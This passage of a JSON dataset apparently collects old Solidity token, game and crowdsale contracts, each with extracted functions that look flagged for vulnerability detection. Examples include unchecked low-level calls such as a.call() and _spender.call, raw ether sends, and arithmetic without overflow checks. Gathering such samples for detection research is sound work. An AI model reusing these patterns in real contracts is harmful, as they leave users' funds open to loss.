  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SummitChainToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SummitChainToken(\n ) {\n balances[msg.sender] = 840000000000000;\n totalSupply = 840000000000000;\n name = \"Summit Chain\";\n decimals = 6;\n symbol = \"SUMC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15d9"
  },
  "filename": "36022.sol",
  "content": "pragma solidity ^0.4.15;\ncontract ITransferable {\n function transfer(address _to, uint256 _value) public returns (bool success);\n}\ncontract PlayToken {\n uint256 public totalSupply = 0;\n string public name = \"PLAY\";\n uint8 public decimals = 18;\n string public symbol = \"PLY\";\n string public version = '1';\n address public controller;\n bool public controllerLocked = false;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n modifier onlyController() {\n require(msg.sender == controller);\n _;\n }\n function PlayToken(address _controller) {\n controller = _controller;\n }\n function setController(address _newController) onlyController {\n require(! controllerLocked);\n controller = _newController;\n }\n function lockController() onlyController {\n controllerLocked = true;\n }\n function mint(address _receiver, uint256 _value) onlyController {\n balances[_receiver] += _value;\n totalSupply += _value;\n Transfer(0, _receiver, _value);\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n require((_to != 0) && (_to != address(this)));\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function withdrawTokens(ITransferable _token, address _to, uint256 _amount) onlyController {\n _token.transfer(_to, _amount);\n }\n}\ncontract P4PGame {\n address public owner;\n address public pool;\n PlayToken playToken;\n bool public active = true;\n event GamePlayed(bytes32 hash, bytes32 boardEndState);\n event GameOver();\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier onlyIfActive() {\n require(active);\n _;\n }\n function P4PGame(address _tokenAddr, address _poolAddr) {\n owner = msg.sender;\n playToken = PlayToken(_tokenAddr);\n pool = _poolAddr;\n }\n function setTokenController(address _controller) onlyOwner {\n playToken.setController(_controller);\n }\n function lockTokenController() onlyOwner {\n playToken.lockController();\n }\n function setPoolContract(address _pool) onlyOwner {\n pool = _pool;\n }\n function addGame(bytes32 hash, bytes32 board) onlyOwner onlyIfActive {\n GamePlayed(hash, board);\n }\n function distributeTokens(address[] receivers, uint16[] amounts) onlyOwner onlyIfActive {\n require(receivers.length == amounts.length);\n var totalAmount = distributeTokensImpl(receivers, amounts);\n payoutPool(totalAmount);\n }\n function shutdown() onlyOwner {\n active = false;\n GameOver();\n }\n function getTokenAddress() constant returns(address) {\n return address(playToken);\n }\n function distributeTokensImpl(address[] receivers, uint16[] amounts) internal returns(uint256) {\n uint256 totalAmount = 0;\n for (uint i = 0; i < receivers.length; i++) {\n playToken.mint(receivers[i], uint256(amounts[i]) * 1e18);\n totalAmount += amounts[i];\n }\n return totalAmount;\n }\n function payoutPool(uint256 amount) internal {\n require(pool != 0);\n playToken.mint(pool, amount * 1e18);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15da"
  },
  "filename": "36023.sol",
  "content": "pragma solidity ^0.4.15;\ncontract ITransferable {\n function transfer(address _to, uint256 _value) public returns (bool success);\n}\ncontract PlayToken {\n uint256 public totalSupply = 0;\n string public name = \"PLAY\";\n uint8 public decimals = 18;\n string public symbol = \"PLY\";\n string public version = '1';\n address public controller;\n bool public controllerLocked = false;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n modifier onlyController() {\n require(msg.sender == controller);\n _;\n }\n function PlayToken(address _controller) {\n controller = _controller;\n }\n function setController(address _newController) onlyController {\n require(! controllerLocked);\n controller = _newController;\n }\n function lockController() onlyController {\n controllerLocked = true;\n }\n function mint(address _receiver, uint256 _value) onlyController {\n balances[_receiver] += _value;\n totalSupply += _value;\n Transfer(0, _receiver, _value);\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n require((_to != 0) && (_to != address(this)));\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function withdrawTokens(ITransferable _token, address _to, uint256 _amount) onlyController {\n _token.transfer(_to, _amount);\n }\n}\ncontract P4PPool {\n address public owner;\n PlayToken public playToken;\n uint8 public currentState = 0;\n uint8 public constant STATE_NOT_STARTED = 0;\n uint8 public constant STATE_DONATION_ROUND_1 = 1;\n uint8 public constant STATE_PLAYING = 2;\n uint8 public constant STATE_DONATION_ROUND_2 = 3;\n uint8 public constant STATE_PAYOUT = 4;\n uint256 public tokenPerEth;\n mapping(address => uint256) round1Donations;\n mapping(address => uint256) round2Donations;\n uint256 public totalPhase1Donations = 0;\n uint256 public totalPhase2Donations = 0;\n uint32 public donationUnlockTs = uint32(now);\n uint8 public constant ownerTokenSharePct = 20;\n address public donationReceiver;\n bool public donationReceiverLocked = false;\n event StateChanged(uint8 newState);\n event DonatedEthPayout(address receiver, uint256 amount);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier onlyDuringDonationRounds() {\n require(currentState == STATE_DONATION_ROUND_1 || currentState == STATE_DONATION_ROUND_2);\n _;\n }\n modifier onlyIfPayoutUnlocked() {\n require(currentState == STATE_PAYOUT);\n require(uint32(now) >= donationUnlockTs);\n _;\n }\n function P4PPool(address _tokenAddr) {\n owner = msg.sender;\n playToken = PlayToken(_tokenAddr);\n }\n function () payable onlyDuringDonationRounds {\n donateForImpl(msg.sender);\n }\n function donateFor(address _donor) payable onlyDuringDonationRounds {\n donateForImpl(_donor);\n }\n function startNextPhase() onlyOwner {\n require(currentState <= STATE_PAYOUT);\n currentState++;\n if(currentState == STATE_PAYOUT) {\n tokenPerEth = calcTokenPerEth();\n }\n StateChanged(currentState);\n }\n function setDonationUnlockTs(uint32 _newTs) onlyOwner {\n require(_newTs > donationUnlockTs);\n donationUnlockTs = _newTs;\n }\n function setDonationReceiver(address _receiver) onlyOwner {\n require(! donationReceiverLocked);\n donationReceiver = _receiver;\n }\n function lockDonationReceiver() onlyOwner {\n require(donationReceiver != 0);\n donationReceiverLocked = true;\n }\n function payoutDonations() onlyOwner onlyIfPayoutUnlocked {\n require(donationReceiver != 0);\n var amount = this.balance;\n require(donationReceiver.send(amount));\n DonatedEthPayout(donationReceiver, amount);\n }\n function destroy() onlyOwner {\n require(currentState == STATE_PAYOUT);\n require(now > 1519862400);\n selfdestruct(owner);\n }\n function withdrawTokenShare() {\n require(tokenPerEth > 0);\n require(playToken.transfer(msg.sender, calcTokenShareOf(msg.sender)));\n round1Donations[msg.sender] = 0;\n round2Donations[msg.sender] = 0;\n }\n function calcTokenShareOf(address _addr) constant internal returns(uint256) {\n if(_addr == owner) {\n var virtualEthBalance = (((totalPhase1Donations*2 + totalPhase2Donations) * 100) / (100 - ownerTokenSharePct) + 1);\n return ((tokenPerEth * virtualEthBalance) * ownerTokenSharePct) / (100 * 1E18);\n } else {\n return (tokenPerEth * (round1Donations[_addr]*2 + round2Donations[_addr])) / 1E18;\n }\n }\n function calcTokenPerEth() constant internal returns(uint256) {\n var tokenBalance = playToken.balanceOf(this);\n var virtualEthBalance = (((totalPhase1Donations*2 + totalPhase2Donations) * 100) / (100 - ownerTokenSharePct) + 1);\n return tokenBalance * 1E18 / (virtualEthBalance);\n }\n function donateForImpl(address _donor) internal onlyDuringDonationRounds {\n if(currentState == STATE_DONATION_ROUND_1) {\n round1Donations[_donor] += msg.value;\n totalPhase1Donations += msg.value;\n } else if(currentState == STATE_DONATION_ROUND_2) {\n round2Donations[_donor] += msg.value;\n totalPhase2Donations += msg.value;\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}",
    "function payoutDonations() onlyOwner onlyIfPayoutUnlocked {\nrequire(donationReceiver != 0);\nvar amount = this.balance;\nrequire(donationReceiver.send(amount));\nDonatedEthPayout(donationReceiver, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15db"
  },
  "filename": "36035.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n address sender = msg.sender;\n require(balances[sender] >= _value);\n balances[sender] -= _value;\n balances[_to] += _value;\n Transfer(sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract GigaGivingToken is StandardToken {\n string public constant NAME = \"Giga Coin\";\n string public constant SYMBOL = \"GC\";\n uint256 public constant DECIMALS = 0;\n uint256 public constant TOTAL_TOKENS = 15000000;\n uint256 public constant CROWDSALE_TOKENS = 12000000;\n string public constant VERSION = \"GC.2\";\n function GigaGivingToken () public {\n balances[msg.sender] = TOTAL_TOKENS;\n totalSupply = TOTAL_TOKENS;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract GigaGivingICO {\n using SafeMath for uint256;\n uint256 private fundingGoal;\n uint256 private amountRaised;\n uint256 public constant PHASE_1_PRICE = 1600000000000000;\n uint256 public constant PHASE_2_PRICE = 2000000000000000;\n uint256 public constant PHASE_3_PRICE = 2500000000000000;\n uint256 public constant PHASE_4_PRICE = 4000000000000000;\n uint256 public constant PHASE_5_PRICE = 5000000000000000;\n uint256 public constant DURATION = 5 weeks;\n uint256 public startTime;\n uint256 public tokenSupply;\n address public beneficiary;\n GigaGivingToken public tokenReward;\n mapping(address => uint256) public balanceOf;\n bool public fundingGoalReached = false;\n bool public crowdsaleClosed = false;\n event GoalReached(address goalBeneficiary, uint256 totalAmountRaised);\n event FundTransfer(address backer, uint256 amount, bool isContribution);\n function GigaGivingICO (address icoToken, address icoBeneficiary) public {\n fundingGoal = 1000 ether;\n startTime = 1510765200;\n beneficiary = icoBeneficiary;\n tokenReward = GigaGivingToken(icoToken);\n tokenSupply = 12000000;\n }\n function () public payable {\n require(now >= startTime);\n require(now <= startTime + DURATION);\n require(!crowdsaleClosed);\n require(msg.value > 0);\n uint256 amount = msg.value;\n uint256 coinTotal = 0;\n if (now > startTime + 4 weeks) {\n coinTotal = amount.div(PHASE_5_PRICE);\n } else if (now > startTime + 3 weeks) {\n coinTotal = amount.div(PHASE_4_PRICE);\n } else if (now > startTime + 2 weeks) {\n coinTotal = amount.div(PHASE_3_PRICE);\n } else if (now > startTime + 1 weeks) {\n coinTotal = amount.div(PHASE_2_PRICE);\n } else {\n coinTotal = amount.div(PHASE_1_PRICE);\n }\n balanceOf[msg.sender] = balanceOf[msg.sender].add(amount);\n amountRaised = amountRaised.add(amount);\n tokenSupply = tokenSupply.sub(coinTotal);\n tokenReward.transfer(msg.sender, coinTotal);\n FundTransfer(msg.sender, amount, true);\n }\n modifier afterDeadline() {\n if (now >= (startTime + DURATION)) {\n _;\n }\n }\n function checkGoalReached() public afterDeadline {\n if (amountRaised >= fundingGoal) {\n fundingGoalReached = true;\n GoalReached(beneficiary, amountRaised);\n }\n crowdsaleClosed = true;\n }\n function safeWithdrawal() public afterDeadline {\n if (!fundingGoalReached) {\n uint amount = balanceOf[msg.sender];\n balanceOf[msg.sender] = 0;\n if (amount > 0) {\n if (msg.sender.send(amount)) {\n FundTransfer(msg.sender, amount, false);\n } else {\n balanceOf[msg.sender] = amount;\n }\n }\n }\n if (fundingGoalReached && beneficiary == msg.sender) {\n if (beneficiary.send(amountRaised)) {\n tokenReward.transfer(msg.sender, tokenSupply);\n FundTransfer(beneficiary, amountRaised, false);\n } else {\n fundingGoalReached = false;\n }\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}",
    "function safeWithdrawal() public afterDeadline {\nif (!fundingGoalReached) {\nuint amount = balanceOf[msg.sender];\nbalanceOf[msg.sender] = 0;\nif (amount > 0) {\nif (msg.sender.send(amount)) {\nFundTransfer(msg.sender, amount, false);\n} else {\nbalanceOf[msg.sender] = amount;\n}\n}\n}\nif (fundingGoalReached && beneficiary == msg.sender) {\nif (beneficiary.send(amountRaised)) {\ntokenReward.transfer(msg.sender, tokenSupply);\nFundTransfer(beneficiary, amountRaised, false);\n} else {\nfundingGoalReached = false;\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15dc"
  },
  "filename": "36036.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n address sender = msg.sender;\n require(balances[sender] >= _value);\n balances[sender] -= _value;\n balances[_to] += _value;\n Transfer(sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract GigaGivingToken is StandardToken {\n string public constant NAME = \"Giga Coin\";\n string public constant SYMBOL = \"GC\";\n uint256 public constant DECIMALS = 0;\n uint256 public constant TOTAL_TOKENS = 15000000;\n uint256 public constant CROWDSALE_TOKENS = 12000000;\n string public constant VERSION = \"GC.2\";\n function GigaGivingToken () public {\n balances[msg.sender] = TOTAL_TOKENS;\n totalSupply = TOTAL_TOKENS;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15dd"
  },
  "filename": "36046.sol",
  "content": "pragma solidity ^0.4.10;\ncontract Caller {\n function callAddress(address a) {\n a.call();\n }\n}",
  "extract_feature": [
    "function callAddress(address a) {\na.call();\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15de"
  },
  "filename": "36084.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'K1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000;\n totalSupply = 100000000000;\n name = \"Kchin Token\";\n decimals = 5;\n symbol = \"KCT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))),\n msg.sender, _value, this, _extraData)) {\n revert();\n }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))),\nmsg.sender, _value, this, _extraData)) {\nrevert();\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15df"
  },
  "filename": "36085.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"Giwaffle Coin\";\n decimals = 18;\n symbol = \"GWFL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e0"
  },
  "filename": "36166.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n assert(false);\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'V0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { require(false); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { require(false); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e1"
  },
  "filename": "36173.sol",
